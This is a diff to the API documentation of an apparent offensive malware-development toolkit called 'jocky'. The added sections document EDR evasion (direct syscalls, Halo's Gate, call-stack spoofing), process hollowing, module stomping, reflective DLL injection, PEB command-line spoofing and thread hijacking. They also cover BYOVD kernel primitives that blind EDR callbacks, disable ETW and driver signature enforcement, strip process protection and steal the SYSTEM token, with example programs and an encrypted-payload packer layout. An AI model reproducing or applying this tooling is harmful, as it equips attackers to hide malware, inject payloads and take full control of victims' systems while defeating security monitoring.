@@ -297,10 +297,20 @@ Call before any sensitive ntdll-routed syscall.
 ffi jocky_unhook_ntdll() -> bool;
 ```
 
+---
+
 ### `jocky_get_syscall_number(zw_name) -> i32`
 
-Reads the syscall number directly from the ntdll stub bytes (Hell's Gate /
-Halo's Gate).  Works through most EDR hooks.
+Resolve the Windows syscall service number (SSN) for a `Zw*`/`Nt*` function
+without relying on the (possibly hooked) ntdll stub.
+
+**Hell's Gate** — reads the SSN directly from the standard `4C 8B D1 B8 xx xx xx xx`
+prologue if the stub has not been patched.
+
+**Halo's Gate** — if the stub is hooked (first bytes differ from the expected
+pattern), scans up to 48 adjacent `Zw*` exports in the name table
+(alphabetical order = monotone SSN order) to find an unhooked neighbor and
+derives the target SSN by offset.
 
 ```
 ffi jocky_get_syscall_number(i8*) -> i32;
@@ -308,23 +318,103 @@ ffi jocky_get_syscall_number(i8*) -> i32;
 let ssn: i32 = jocky_get_syscall_number("NtAllocateVirtualMemory");
 ```
 
-### `jocky_direct_syscall(syscall_number, ...) -> i64`
+Returns `0xFFFFFFFF` if resolution fails entirely.
 
-Executes a syscall instruction directly with the given number.  Arguments are
-passed in the standard Windows x64 calling convention after `syscall_number`.
+---
+
+### `jocky_direct_syscall(ssn, a1, a2, a3, a4) -> i64`
+### `jocky_direct_syscall4(ssn, a1, a2, a3, a4) -> i64`  *(alias)*
+
+Allocate a one-shot RWX stub containing:
 
 ```
-ffi jocky_direct_syscall(i32, ...) -> i64;
+mov r10, rcx
+mov eax, <ssn>
+syscall
+ret
+```
+
+Call it via a typed function pointer so the C calling convention places extra
+arguments at the correct `[rsp+0x28]`, `[rsp+0x30]` offsets as expected by
+the Windows kernel.  Does not call through ntdll at all.
+
+```
+ffi jocky_direct_syscall(i32, i64, i64, i64, i64) -> i64;
+```
+
+---
+
+### `jocky_find_ret_gadget() -> i8*`
+
+Scan ntdll.dll's `.text` section for a `ret; int3` byte pair (`0xC3 0xCC`).
+Falls back to any `0xC3` in `.text` if no clean pair is found.  The result
+is cached after the first successful call.
+
+```
+ffi jocky_find_ret_gadget() -> i8*;
+```
+
+---
+
+### `jocky_spoof_call(fn, a1, a2, a3, a4) -> i64`
+
+Call `fn(a1,a2,a3,a4)` with the immediate return address on the stack
+replaced by a RET gadget inside ntdll.dll.
+
+While `fn` executes, a stack walk shows:
+
+```
+fn  ←  ntdll!<ret gadget>   (legitimate module)
+       our real return addr  (buried deeper, not examined by most EDRs)
+```
+
+Implemented as a dynamically-built 28-byte trampoline stub (no inline
+assembly):
+
+```
+pop  rax                ; save call-return address
+mov  r11, <gadget VA>   ; 64-bit gadget address
+push rax                ; push deeper (gadget ret → home)
+push r11                ; visible return address = ntdll gadget
+jmp  [rip+0]            ; jump to fn
+.qword fn
+```
+
+Falls back to a plain call if no gadget is found or the RWX allocation fails.
+
+```
+ffi jocky_spoof_call(i8*, i64, i64, i64, i64) -> i64;
+```
+
+---
+
+### `jocky_spoof_syscall(ssn, a1, a2, a3, a4) -> i64`
+
+Same stack-spoofing trampoline as `jocky_spoof_call`, but the jump target is
+replaced with an inline `mov r10,rcx; mov eax,ssn; syscall; ret` body.
+
+The kernel sees a return address inside ntdll when it inspects the user-mode
+call stack.
+
+```
+ffi jocky_spoof_syscall(i32, i64, i64, i64, i64) -> i64;
 ```
 
 ---
 
 ## 6  Execution  *(Windows only)*
 
+Five complementary in-memory execution primitives.  All require
+`PROCESS_ALL_ACCESS` on the target (i.e., elevated privileges or a
+same-integrity target).
+
+---
+
 ### `jocky_process_hollow(target_path, payload, payload_size) -> bool`
 
-Creates `target_path` suspended, unmaps its image, maps `payload` at the
-original base, fixes the entry point, and resumes the thread.
+**Process hollowing** — `CreateProcessW(CREATE_SUSPENDED)` → unmap the
+target's original image → write `payload` headers and sections at the same
+base → patch `PEB.ImageBaseAddress` and the initial thread's `Rcx` → resume.
 
 ```
 ffi jocky_process_hollow(i8*, i8*, i64) -> bool;
@@ -332,16 +422,138 @@ ffi jocky_process_hollow(i8*, i8*, i64) -> bool;
 
 | Parameter | Meaning |
 |-----------|---------|
-| `target_path`   | Wide-char path to the host process (e.g. `svchost.exe`) – cast `i8*` to `wchar_t*` in the FFI |
-| `payload`       | In-memory PE image to inject |
-| `payload_size`  | Size of payload in bytes |
+| `target_path`  | Wide-char path to the host process – pass as `i8*` |
+| `payload`      | Raw PE image bytes |
+| `payload_size` | Byte count |
+
+---
 
 ### `jocky_module_stomp(pid, module_name, payload, payload_size) -> bool`
 
-Overwrites a loaded DLL in a remote process with `payload`.
+**Module stomping** — finds `module_name` in `pid`'s loaded-module list,
+calls `VirtualProtectEx` to make that region `RWX`, overwrites headers and
+sections with `payload`, then `CreateRemoteThread` at the payload entry point.
+
+The stomped module's entry remains in the PEB loader list, so any stack walk
+that originates from the new code shows a legitimate module name.
 
 ```
 ffi jocky_module_stomp(i32, i8*, i8*, i64) -> bool;
+```
+
+| Parameter | Meaning |
+|-----------|---------|
+| `pid`         | Target PID |
+| `module_name` | Wide-char name as it appears in Task Manager, e.g. `"clr.dll"` |
+| `payload`     | Raw PE image |
+| `payload_size`| Byte count |
+
+---
+
+### `jocky_rdll_inject(pid, dll_bytes, dll_size) -> bool`
+
+**Reflective DLL injection** — copies `dll_bytes` to a fresh `RWX` allocation
+in `pid`, locates the `ReflectiveLoader` export inside the raw bytes, and
+`CreateRemoteThread`s at it with `remote_base` as the argument.
+
+The `ReflectiveLoader` function inside the DLL is responsible for:
+1. Applying base relocations.
+2. Walking its own IAT and resolving imports via the PEB loader list.
+3. Calling `DllMain(hModule, DLL_PROCESS_ATTACH, NULL)`.
+
+Returns `false` immediately if the DLL has no `ReflectiveLoader` export.
+The DLL must be compiled as a reflective loader (see the
+[ReflectiveDLLInjection](https://github.com/stephenfewer/ReflectiveDLLInjection)
+reference implementation).
+
+```
+ffi jocky_rdll_inject(i32, i8*, i64) -> bool;
+```
+
+| Parameter  | Meaning |
+|------------|---------|
+| `pid`      | Target PID |
+| `dll_bytes`| Raw DLL file bytes (file layout, not mapped layout) |
+| `dll_size` | Byte count |
+
+---
+
+### `jocky_p3_poison(pid, fake_cmdline, fake_image_path) -> bool`
+
+**Process parameter poisoning (P³)** — overwrites
+`PEB.RTL_USER_PROCESS_PARAMETERS.CommandLine` and/or `.ImagePathName` in
+`pid`'s address space.  After this call, any tool or EDR that reads those
+fields via `ReadProcessMemory` (Process Hacker, Sysmon) will see the spoofed
+values.
+
+Each new string is written into a freshly-allocated `PAGE_READWRITE` region so
+the existing string buffers are not corrupted.  The `UNICODE_STRING.Buffer`
+pointer and both length fields are updated atomically per field.
+
+Pass `NULL` for any field you do not want to change.
+
+```
+ffi jocky_p3_poison(i32, i8*, i8*) -> bool;
+```
+
+| Parameter         | Meaning |
+|-------------------|---------|
+| `pid`             | Target PID |
+| `fake_cmdline`    | New `CommandLine` wide string, or `0` |
+| `fake_image_path` | New `ImagePathName` wide string, or `0` |
+
+> **Note:** This patches the in-memory PEB only.  The `CommandLine` reported
+> by `GetCommandLineW` from *within* the target process reads the same PEB
+> field, so the target itself will also see the spoofed value if it calls that
+> API after the patch.
+
+---
+
+### `jocky_thread_hijack(pid, shellcode, shellcode_size) -> bool`
+
+**Thread execution hijacking** — finds the first thread in `pid` (excluding
+the caller's own), suspends it, injects `shellcode` into a fresh `RWX`
+allocation, redirects the thread's `RIP` to the shellcode, and resumes.
+
+The hijacked thread executes the shellcode next time it is scheduled.
+The shellcode is responsible for preserving any registers and stack state if
+it wants to return cleanly to the original thread context.
+
+```
+ffi jocky_thread_hijack(i32, i8*, i64) -> bool;
+```
+
+| Parameter        | Meaning |
+|------------------|---------|
+| `pid`            | Target PID |
+| `shellcode`      | Raw shellcode bytes |
+| `shellcode_size` | Byte count |
+
+---
+
+### Combined execution example
+
+```
+ffi jocky_runtime_init()                      -> i32;
+ffi jocky_unhook_ntdll()                      -> bool;
+ffi jocky_p3_poison(i32, i8*, i8*)            -> bool;
+ffi jocky_rdll_inject(i32, i8*, i64)          -> bool;
+
+fn main() -> void {
+    let t: i32 = jocky_runtime_init();
+    if t != 0 { return; }
+
+    jocky_unhook_ntdll();
+
+    // Spoof explorer.exe's command line before injecting
+    let pid: i32 = 1234;   // explorer.exe PID
+    jocky_p3_poison(pid, "C:\\Windows\\explorer.exe", 0);
+
+    // Inject a reflective DLL (dll_buf / dll_len populated earlier)
+    let dll_buf: i8* = 0;   // pointer to DLL bytes
+    let dll_len: i64 = 0;   // byte count
+    jocky_rdll_inject(pid, dll_buf, dll_len);
+}
 ```
 
 ---
@@ -435,6 +647,269 @@ fn main() -> void {
     jocky_self_delete();
 }
 ```
+
+---
+
+---
+
+## 10  Kernel Exploitation Primitives  *(Windows only, requires BYOVD)*
+
+All functions here require a `jocky_byovd_t` filled by `jocky_byovd_load()`.
+
+### Bootstrap (happens automatically on first call)
+
+1. OS build number → selects EPROCESS offset table (pre-1903 vs 1903+).
+2. `NtQuerySystemInformation` → ntoskrnl VA + size.
+3. Physical memory scan (0x80000 → 1 GB) → System EPROCESS (PID 4).
+4. Read `EPROCESS.DirectoryTableBase` at that PA → CR3.
+5. All subsequent calls translate kernel VAs via 4-level page-table walk + `jocky_driver_read/write_phys`.
+
+The scan takes ≈ 1–3 s on first call.  All subsequent calls use the cached CR3.
+
+---
+
+### `jocky_kread(ctx, kva, out, size) -> bool`
+### `jocky_kwrite(ctx, kva, in, size) -> bool`
+
+Read/write arbitrary kernel virtual memory.  These are the low-level
+primitives all exploitation functions are built on.  Exposed publicly for
+advanced use (e.g. reading EPROCESS fields not wrapped by a higher-level
+function).
+
+```
+ffi jocky_kread (i8*, i64, i8*, i32) -> bool;
+ffi jocky_kwrite(i8*, i64, i8*, i32) -> bool;
+```
+
+---
+
+### `jocky_disable_edr_callbacks(ctx) -> bool`
+
+Zeroes every active `RoutineBlock*` in the three kernel notify arrays:
+
+| Array | Max slots | Effect |
+|-------|-----------|--------|
+| `PspCreateProcessNotifyRoutine` | 64 | EDR misses process creation |
+| `PspCreateThreadNotifyRoutine`  | 64 | EDR misses thread creation |
+| `PspLoadImageNotifyRoutine`     | 64 | EDR misses image loads |
+
+Finds each array by scanning the first 256 bytes of the corresponding
+`Ps*NotifyRoutine` export for a `LEA` instruction referencing the array.
+
+Returns `true` if at least one callback was removed.
+
+```
+ffi jocky_disable_edr_callbacks(i8*) -> bool;
+```
+
+---
+
+### `jocky_disable_etw(ctx) -> bool`
+
+Finds and zeroes the `EtwpEventEnabled` flag referenced in `EtwEventWrite`
+(or `EtwEventWriteFull` / `EtwEventWriteEx` as fallbacks).  Once cleared,
+all kernel `EtwEventWrite` paths return without logging.
+
+```
+ffi jocky_disable_etw(i8*) -> bool;
+```
+
+---
+
+### `jocky_strip_ppl(ctx, pid) -> bool`
+
+Clears `EPROCESS.Protection` (the `PS_PROTECTION` byte) for the given PID.
+
+| Byte value | Meaning |
+|-----------|---------|
+| `0x72`    | PPL Antimalware |
+| `0x62`    | PPL Windows |
+| `0x41`    | PP Windows TCB |
+| `0x00`    | No protection (after this call) |
+
+After stripping, the process can be opened with `PROCESS_ALL_ACCESS`.
+
+```
+ffi jocky_strip_ppl(i8*, i32) -> bool;
+```
+
+---
+
+### `jocky_elevate_token(ctx, target_pid) -> bool`
+
+Replaces `EPROCESS.Token` of `target_pid` with the SYSTEM process token,
+granting the target process SYSTEM-level privileges.  The low 4 bits of the
+`EX_FAST_REF` reference count are preserved from the original token.
+
+```
+ffi jocky_elevate_token(i8*, i32) -> bool;
+```
+
+### `jocky_downgrade_token(ctx, target_pid) -> bool`
+
+Strips `SeDebugPrivilege` (bit 20), `SeTcbPrivilege` (bit 7), and
+`SeLoadDriverPrivilege` (bit 10) from the `Enabled` and `EnabledByDefault`
+bitmasks inside `target_pid`'s primary token.
+
+```
+ffi jocky_downgrade_token(i8*, i32) -> bool;
+```
+
+---
+
+### `jocky_disable_dse(ctx) -> bool`
+
+Sets `g_CiOptions` in `ci.dll` to `0`, disabling Driver Signature
+Enforcement.  Finds `g_CiOptions` by scanning `CiInitialize` for a MOV
+instruction that stores the initial option value (typically `6`).
+
+> **⚠ PatchGuard monitors `g_CiOptions`.**  Call this only inside a
+> PG-suppression window.  The original value is cached; always call
+> `jocky_restore_dse()` before unloading the driver to avoid a KeBugCheck.
+
+```
+ffi jocky_disable_dse(i8*) -> bool;
+```
+
+### `jocky_restore_dse(ctx) -> bool`
+
+Restores `g_CiOptions` to the value captured by `jocky_disable_dse()`.
+No-op (returns `false`) if `jocky_disable_dse` was never called.
+
+```
+ffi jocky_restore_dse(i8*) -> bool;
+```
+
+---
+
+### Full exploitation example
+
+```
+ffi jocky_runtime_init()             -> i32;
+ffi jocky_byovd_load(i8*, i8*, i8*) -> bool;
+ffi jocky_disable_edr_callbacks(i8*) -> bool;
+ffi jocky_disable_etw(i8*)           -> bool;
+ffi jocky_disable_dse(i8*)           -> bool;
+ffi jocky_elevate_token(i8*, i32)    -> bool;
+ffi jocky_restore_dse(i8*)           -> bool;
+ffi jocky_byovd_unload(i8*)          -> void;
+
+fn main() -> void {
+    let t: i32 = jocky_runtime_init();
+    if t != 0 { return; }
+
+    let ctx: i8* = 0;   // allocate 584 bytes
+    let ok: bool = jocky_byovd_load("WinRing0x64", "WinRing0_1_2_0", ctx);
+    if !ok { return; }
+
+    // Blind EDR
+    jocky_disable_edr_callbacks(ctx);
+    jocky_disable_etw(ctx);
+
+    // Load unsigned driver after disabling DSE
+    jocky_disable_dse(ctx);
+    // ... load unsigned driver via SCM ...
+    jocky_restore_dse(ctx);
+
+    // Escalate self to SYSTEM
+    // (GetCurrentProcessId() via ffi or hardcode your PID)
+    let my_pid: i32 = 1234;
+    jocky_elevate_token(ctx, my_pid);
+
+    jocky_byovd_unload(ctx);
+}
+```
+
+---
+
+---
+
+## Build Pipeline & PE Section Layout
+
+`jockyc` runs these post-link steps (Windows, in order):
+
+```
+  link output
+       │
+  [--embed-driver]  ──► appendSection(.jdrv)   RC4-encrypted driver bytes
+       │
+  [--manifest]      ──► appendSection(.jmani)  IOCTL primitive table
+       │
+  [--pack]          ──► RC4 encrypt .text + .rdata in-place
+                        appendSection(.jkey)   16-byte RC4 key
+       │
+  (always)          ──► appendSection(.jtamp)  XOR-folded CRC32 over all sections
+```
+
+---
+
+### `.jdrv` section  (`--embed-driver <driver.sys>`)
+
+Embedded driver, RC4-encrypted with a per-build random key.
+
+```
+Offset  Size  Field
+0       8     magic      "JOCKYDRV"
+8       4     orig_size  plaintext driver byte count
+12      16    rc4_key    random 16-byte key
+28      N     data       RC4(driver bytes, rc4_key)
+```
+
+Read at runtime by `jocky_byovd_load()`.
+
+---
+
+### `.jmani` section  (`--manifest <manifest.txt>`)
+
+Compact binary table of named IOCTL primitives for `jocky_driver_invoke()`.
+
+Manifest text file format (one entry per non-comment line):
+```
+# name         ioctl       in_bytes  out_bytes
+read_phys      0x9C402584  8         4
+write_phys     0x9C402588  12        0
+read_msr       0x9C40258C  4         8
+write_msr      0x9C402590  12        0
+```
+
+Binary encoding in the section:
+```
+Offset  Size  Field
+0       4     magic    "JMNI"
+4       4     version  0x00000001
+8       4     count    number of entries
+12+     var   entries  per entry: [1B name_len][N name][4B ioctl][2B in_sz][2B out_sz]
+```
+
+Read at runtime by `jocky_manifest_load()` (called automatically from `jocky_runtime_init()`).
+
+---
+
+### `.jkey` section  (`--pack`)
+
+Holds the 16-byte RC4 key used to encrypt `.text` and `.rdata`.  The stub
+loader (not yet implemented) reads this, decrypts in-place, then jumps to OEP.
+
+```
+Offset  Size  Field
+0       16    rc4_key   key for .text + .rdata decryption
+```
+
+---
+
+### `.jtamp` section  (always added for Windows targets)
+
+Anti-tamper checksum.  Computed last so it covers the final binary state,
+including any embedded `.jdrv`, `.jmani`, and `.jkey` sections.
+
+```
+Offset  Size  Field
+0       8     magic     "JOCKYTMP"
+8       4     flags     0x00000001  (version / algorithm indicator)
+12      4     checksum  XOR-fold of CRC32 over all other sections' raw data
+```
+
+Verified at startup by `jocky_verify_integrity()`.  Mismatch calls `ExitProcess(0xDEAD1337)`.
 
 ---
 
